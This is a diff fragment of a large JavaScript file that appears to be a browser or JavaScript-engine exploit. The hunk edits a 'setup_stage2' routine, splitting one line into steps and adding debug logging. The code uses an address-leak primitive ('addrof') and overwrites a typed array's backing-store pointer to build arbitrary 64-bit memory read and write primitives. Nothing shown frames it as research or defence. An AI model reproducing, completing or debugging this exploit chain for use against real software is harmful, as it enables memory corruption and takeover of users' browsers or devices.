@@ -18386,7 +18386,13 @@ const device_chipset = {
             p.write64(ptr, value);
           };
           print("setup_stage2: pointing read64 backing store");
-          change_scribble[1] = p.addrof(read64_biguint64arr).add(8n).asDouble();
+          print("setup_stage2: addrof read64_biguint64arr begin");
+          let read64_biguint64arr_addr = p.addrof(read64_biguint64arr);
+          print(`setup_stage2: read64_biguint64arr=${read64_biguint64arr_addr.hex()}`);
+          print("setup_stage2: retarget read64 backing store begin");
+          change_scribble[1] = read64_biguint64arr_addr.add(8n).asDouble();
+          print("setup_stage2: retarget read64 backing store done");
+          print("setup_stage2: reading read64 backing bytes");
           let read64_float64arr_bytes = BigInt.fromDouble(scribble_element[1]);
           print(`setup_stage2: read64_float64arr_bytes=${read64_float64arr_bytes.hex()}`);
           read64_biguint64arr[0] = 0x10000000006n;
